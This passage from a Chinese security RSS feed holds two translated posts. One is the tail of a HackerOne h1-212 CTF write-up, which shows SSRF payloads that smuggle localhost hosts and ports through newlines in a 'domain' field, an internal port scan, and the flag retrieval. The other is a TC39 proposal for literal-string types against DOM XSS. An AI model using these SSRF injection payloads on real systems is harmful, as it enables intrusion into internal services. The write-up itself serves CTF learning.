{&quot;next&quot;:&quot;\/read.php?id=21&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3e516f680a16f504323ff93bc034d538_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1329&quot; data-rawheight=&quot;675&quot;&gt;&lt;p&gt;正如上图所示，请求了Localhost:80 并返回 web 服务器的主页。为了确认一下，我发送了 /flag 请求却得到了这个臭名昭著的响应：&lt;/p&gt;&lt;blockquote&gt;You really thought it would be that easy? Keep digging!&lt;/blockquote&gt;&lt;p&gt;Emmmm，好吧，我知道 SSH 端口是开放的虽然不能建立连接，但我可以抓取 banner 信息呀：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request:
{&quot;domain&quot;:&quot;212\nlocalhost.:22\n.com&quot;} Notice the :22 next
to .localhost? 
Response: {&quot;next&quot;:&quot;\/read.php?id=27&quot;} &lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9f8212451d24be23cadd6853e9fc3e69_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1296&quot; data-rawheight=&quot;422&quot;&gt;&lt;p&gt;太棒了，我可以进行端口扫描。有没有开放内部端口呢？是时候打开 intruder 了，我快速生成了一个 0-65535 的数字列表：seq 65535&amp;gt; port.txt&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0cba25630eeadbf25f144cfb237d7a51_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1303&quot; data-rawheight=&quot;464&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-da08f40e7a00f5b13ccb89e39a61f6c3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;867&quot; data-rawheight=&quot;433&quot;&gt;&lt;p&gt;在 194-200（除了22-80）响应长度都是相同的，我需要再次运行 intruder 但这次针对 read.php?id=ID_HERE 。&lt;/p&gt;&lt;p&gt;每个空的响应 {&quot;data&quot;:&quot;&quot;} 都有 178 个字节，但这里出现了一个210 字节长的响应并且 数据还被 bease64 加密了的：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7792d5afe45acf764e6019098d8af562_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;772&quot; data-rawheight=&quot;176&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e8866ab39d05d86972d77319fd049485_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;712&quot; data-rawheight=&quot;322&quot;&gt;&lt;p&gt;哇，一些内部 HTTP 端口是开放的，现在我需要用得到的正确 id 去连接正确的端口。&lt;/p&gt;&lt;p&gt;当 intruder 向 localhost:1337 发送请求时分配给我的 id 是 2653 。&lt;/p&gt;&lt;h2&gt;问题的结尾&lt;/h2&gt;&lt;p&gt;目前获得信息是：&lt;/p&gt;&lt;p&gt;1. 内部 HTTP 服务器 监听着 1337端口；&lt;/p&gt;&lt;p&gt;2. 主页显示：Hmm, where would it be?&lt;/p&gt;&lt;p&gt;歪，为什么不试试 /flag ，可能在这儿，对吗？&lt;/p&gt;&lt;p&gt;请求 body: {&quot;domain&quot;:&quot;212\nlocalhost.:1337/flag\n.com&quot;}&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0d2ff566803e2900cb9b2f770094eb9c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;574&quot;&gt;&lt;p&gt;在这儿呢：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;FLAG: 
CF,2dsV\/]fRAYQ.TDEp`w&quot;M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=&amp;lt;tqhnF&amp;lt;aq=K5:BC@Sb*{[%z&quot;+@yPb/nfFna&amp;lt;e$hv{p8r2[vMMF52y:z/Dh;{6
&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-db62433e049b6242c2429b219b2d175a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;533&quot;&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;无论我能否赢得这场 NYC 之旅，这次的 CTF 都绝对是一次有趣的经历，我很感激自己能有这次练习的机会成为一个更好的 hacker 。我在这次 CTF 中学到的一点是永不放弃（事实上，喝咖啡的休息时间让我有了新思路），同时质疑应用程序中的每个功能。&lt;/p&gt;&lt;p&gt;很开心成为解决这个问题的少数黑客之一！&lt;/p&gt;&lt;p&gt;感谢HackerOne，Jobert Abma和在这个项目上努力工作的其他人。期待更多的挑战。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;原文：https://0xc0ffee.io/writeups/h1-212/&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-25-31386355</guid>
<pubDate>Sat, 25 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Ecma TC39 规范提议 - Literals in script</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-11-21-31237220.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Ecma TC39 规范提议 - Literals in script&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31237220&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-10339375c8ca41aa4cb4c6f2030bbb17_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;动机&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;HTML 的 DOM （文档对象模型）提供了一系列的机制将任意字符串转换为标签（.innerHTML = ...）或代码（scriptEl.innerText =..., el.onclick = ..., etc）。每一种机制都能触发 XSS 攻击，攻击者可以将代码插入到我们不期望的上下文中，导致基于 DOM 的 XSS 攻击，那正是我们一直试图避免的。&lt;/p&gt;&lt;p&gt;一种解决此问题的好方法（&lt;a href=&quot;https://research.google.com/pubs/pub42934.html&quot;&gt;谷歌也在使用&lt;/a&gt;）是移除基于字符串的 API ，而是使用强类型的接口，它会在应用程序进入时进行强制的检测和过滤。如果开发人员将自己置身于这种体系之中，他们将不必深入审查每种 XSS 接收器的用法，从而有更多的精力去关注生成类型对象的代码，如： SafeHtml 或 SafeUrl 。&lt;a href=&quot;https://github.com/mikewest/trusted-types&quot;&gt;可信类型&lt;/a&gt;的策略就是为了做到这点。&lt;/p&gt;&lt;p&gt;在大多数情况下，这种机制可以完全可以在 DOM 和 &lt;a href=&quot;https://en.wikipedia.org/wiki/Web_IDL&quot;&gt;WebIDL&lt;/a&gt;（web接口定义语言） 中实现，不需要触及底层的语言。然而，谷歌内部的安全审查员发现，如果没有语言层面的 hook ，很难在网络上普及。&lt;/p&gt;&lt;p&gt;Closure 编译器可以分辨作为文本嵌入到程序中的字符串，以及作为某些操作（方法调用，属性获取等）的结果的字符串。它强制约束类 &lt;a href=&quot;https://google.github.io/closure-library/api/goog.string.Const.html&quot;&gt;goog.string.Const&lt;/a&gt; ，从而保证对象只能由文本创建，这在谷歌的生产代码中是相当常见的，也被证明是安全的（在没有直接注入脚本的情况下攻击者是不能控制文本的值的）。&lt;/p&gt;&lt;p&gt;也就是说，开发人员可以先创建一个 goog.string.Const，接着生成一个 SafeUrl 对象，然后在工厂方法中使用：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;const url = goog.string.Const.from(&quot;https://safe.test/totally/safe/url&quot;);
return SafeUrl.fromConstant(url);&lt;/code&gt;&lt;p&gt;如果能在平台上应用这个断言，而不是完全依赖基于时间的检测，那将是十分有用的。客户端的 断言能够提高检测的稳健性，进行深度的防御，从而建立一个安全的网络，尤其是代码在程序发布后不经编译偷偷溜走的情况下。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;提议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我没有足够的语言背景来给出可靠的建议。相反，我有上面的用例，以及我想从平台方面看到的模糊草图。我很乐意从真正了解这方面语言特性的人那里得到反馈。&lt;/p&gt;&lt;p&gt;考虑到这一点：关于可能合理也可能不合理的猜测如下！&lt;/p&gt;&lt;h2&gt;文本字符串类型&lt;/h2&gt;&lt;p&gt;一种方法是使用一种与文本字符串相对应的新的字符串类型，WebIDL 可以在其之上建立一种新的字符串类型，以便在执行类型检查时区分文本类型。也就是说，今天我们可以生成如下的WebIDL 代码片段：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;interface TrustedHTML {
 static TrustedHTML escape(DOMString html);
}; &lt;/code&gt;&lt;p&gt;这个接口可以这样调用：TrustedHTML.escape(&quot;Literalstring!&quot;)，并且 调用TrustedHTML.escape(formField.value) 可以根据需要转义字符串。&lt;/p&gt;&lt;p&gt;理想情况下我们可以添加如下内容：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;interface TrustedHTML { 
 static TrustedHTML createFromLiteral(LiteralString html);
}; &lt;/code&gt;&lt;p&gt;这个接口可以这样调用：TrustedHTML.createFromLiteral(&quot;Literalstring!&quot;)，但调用TrustedHTML.createFromLiteral(formField.value) 会抛出一个 TypeError。&lt;/p&gt;&lt;p&gt;理想情况下，我们还可以将文字与其他文字（在代码库中常见的线宽限制）结合使用。也就是说，我们会允许以下内容：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;TrustedHTML.createFromLiteral(&quot;A marginally longer literal string that seems to keep going &quot; +
                             &quot;and going and going and going. Wow, what a long string.&quot;);&lt;/code&gt;&lt;p&gt;同样理想的情况下，我们会跟踪字符串的字面意思。也就是说，我们会允许以下内容：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;let a = &quot;Literal string!&quot;;
TrustedHTML.createFromLiteral(a);

let b = &quot;Another literal!&quot;;
TrustedHTML.createFromLiteral(a + b);

let c = a + b;
TrustedHTML.createFromLiteral(c);&lt;/code&gt;&lt;h2&gt;限制标签的功能&lt;/h2&gt;&lt;p&gt;另一方法是在标签模板字符串上建立类似的体系，也就是说，可以想象如下代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function trustedUrlizer(templateString) {
 return TrustedUrl.unsafelyCreate(templateString);
}

return trustedUrlizer`https://safe.test/totally/safe/url`;&lt;/code&gt;&lt;p&gt;如果我们也有一种机制使标签函数仅接收模板字符串，这将是很好的，也就是说，trustedUrlizer(formField.value) 将会执行失败 或许还会抛出类型错误。 &lt;/p&gt;&lt;p&gt;Daniel Ehrenberg 在 &lt;a href=&quot;https://github.com/mikewest/tc39-proposal-literals/issues/2&quot;&gt;mikewest/tc39-proposal-literals#2&lt;/a&gt; 中也稍微提了一下：&lt;/p&gt;&lt;p&gt;我想象 API 的表层是这样的：模板标签的第一个参数有个额外的属性：文本，它表明了传入模板的参数是否是个文本类型。我们可以通过将其表示为一个内部插槽，并将其文本作为一个自己的getter来使其变为不可伪造，这可以防止攻击者使用任何具有literal: true属性的旧对象调用您的模板：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// Un-monkey-patchable way to get the getter
let getLiteral = Object.getOwnPropertyDescriptor((_ =&amp;gt; _)``, &quot;literal&quot;).get; 

function literalString(strings, ...keys) {
 if (!getLiteral.call(strings)) throw new Error();
 return String.raw(strings, ...keys);
}&lt;/code&gt;&lt;p&gt;这个 literalString 模板标签就像 String.raw ，但是如果不传入文本的话就会抛出异常。它输出一个文本类型的字符串。这或许是值得推崇的方式来调用需要文本字符串的方法。因为strings对象（及其内部raw对象）被冻结，所以不能破坏文本字符串内容。&lt;/p&gt;&lt;p&gt;为此，我只补充一点，我们希望确保文本在 WebIDL 中被使用的，以便我们对内置标签函数进行强制的检测，但这好像超出了我们今天讨论的范围。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;常见问题&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;不能只用 Closure 或其它基于时间的检查来做这件事情吗？&lt;br&gt;&lt;/b&gt;是的，实际上谷歌正在内部这样做。参与构建过程的人员希望通过在已经完成的构建时间分析的基础上对客户端检查进行分层来使其更健壮。上面提到的&lt;code class=&quot;inline&quot;&gt;TrustedTypes&lt;/code&gt;也会受益于&lt;code class=&quot;inline&quot;&gt;fromLiteral&lt;/code&gt;构建机制，正如谷歌代码库中的情况表明，这个机制既安全又可用。&lt;/li&gt;&lt;li&gt;&lt;b&gt;我们需要在多大程度上追踪文本？&lt;br&gt;&lt;/b&gt;一个很好的问题！我很欣慰！ 有一件事我们不需要跟踪，就像使用文字作为对象的关键。也就是说，我非常高兴把{“a”：“value”}和{a：“value”}和obj [“a”] =“value”作为键值相同的值。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;现有技术&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;被Closure编译器支持的&lt;code class=&quot;inline&quot;&gt;&lt;a href=&quot;https://google.github.io/closure-library/api/goog.string.Const.html&quot;&gt;goog.string.Const&lt;/a&gt;&lt;/code&gt; 。&lt;/li&gt;&lt;li&gt;GWT还提供了&lt;code class=&quot;inline&quot;&gt;&lt;a href=&quot;http://www.gwtproject.org/javadoc/latest/com/google/gwt/safehtml/shared/SafeHtmlUtils.html#fromSafeConstant-java.lang.String-&quot;&gt;SafeHtml.fromSafeConstant&lt;/a&gt;进行&lt;/code&gt;编译时检查。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/google/safe-html-types/blob/master/doc/safehtml-types.md&quot;&gt;https://github.com/google/safe-html-types/blob/master/doc/safehtml-types.md&lt;/a&gt;讲述了在C ++（&lt;code class=&quot;inline&quot;&gt;TrustedResourceUrl::FromConstant&lt;/code&gt;）中类似概念的用法。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;https://github.com/mikewest/tc39-proposal-literals&quot;&gt;mikewest/tc39-proposal-literals&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-21-31237220</guid>
<pubDate>Tue, 21 Nov 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
